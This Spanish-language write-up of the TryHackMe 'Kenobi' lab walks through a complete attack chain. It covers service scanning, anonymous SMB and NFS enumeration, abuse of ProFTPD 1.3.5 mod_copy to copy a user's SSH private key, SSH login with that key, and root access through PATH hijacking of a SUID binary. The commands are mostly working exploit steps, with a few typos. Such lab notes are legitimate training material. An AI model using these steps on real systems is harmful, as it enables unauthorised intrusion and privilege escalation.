https://tryhackme.com/r/room/kenobi
# Fase de reconocimiento
## Buscar puertos abiertos
```
nmap -sS -p- --open --min-rate=5000 -T5 -vvv -Pn -n 10.10.70.164 -oG allPorts
```
![[Pasted image 20240428014336.png]]
## Reconocimiento de servicios
```
nmap -sCV -p21,22,80,111,139,445,2049,37351,42033,54489,59577 10.10.70.164 -oN targeted
```
![[Pasted image 20240428014619.png]]

## SAMBA
Nos conectamos
```
smbclient //10.10.70.164/anonymous
```
Encontramos un log.txt con información sobre el FTP
```
smb:> get log.txt
```

![[Pasted image 20240428022950.png]]
## Comprobar el RPC
En nuesttro caso es un network file system
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.70.164
```
![[Pasted image 20240428023330.png]]
## FTP
El FTP es proftpd version 1.3.5
```
searchsploit proftpd
```
![[Pasted image 20240428023534.png]]
Podemos observar que es vulnerable a mod_copy por lo que podemos copiar y pegar ficheros del sistema donde queramos.

# Fase de explotación
## Copiar la clave privada
Vemos la clave privada donde se guarda en el log.txt
Nos conectamos al ProFTPD
```
nc 10.10.70.164
```
```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
![[Pasted image 20240428024023.png]]

## Montar /var del network file system
```
mkdir /mnt/kenobi
```
```
mount 10.10.70.164:/var /mnt/kenobi
```
```
cd /mnt/kenobi/tmp
```
Copiamos la clave privada
Nos conectamos por SSH al servidor
```
ssh kenobi@10.10.70.164 -i id_rsa
```
[-] ==pwned!==

# Privilege Escalation
## Privilege Escalation via SUID
1. Primero buscamos archivos donde tenga permisos
```
find / -perm-u=s -type f 2>/dev/null
```
2. Encontramos un /usr/bin/menu
3. Vemos que ejecuta comandos como root
4. Comprobamos que comandos utiliza
```
strings /usr/bin/menu
```
![[Pasted image 20240428030345.png]]
Podemos observar que ejecuta los comandos sin ruta absoluta 
5. En el home del usuario creamos un archivo llamado curl que ejecute el comando /bin/bash
```
echo /bin/bash > curl
```
7. Lo añadimos a el PATH
```
export PATH=/home/kenobi:$PATH
```
9. Ejecutamos en el menu la opción que ejecuta el curl
[+] ==pwned!==
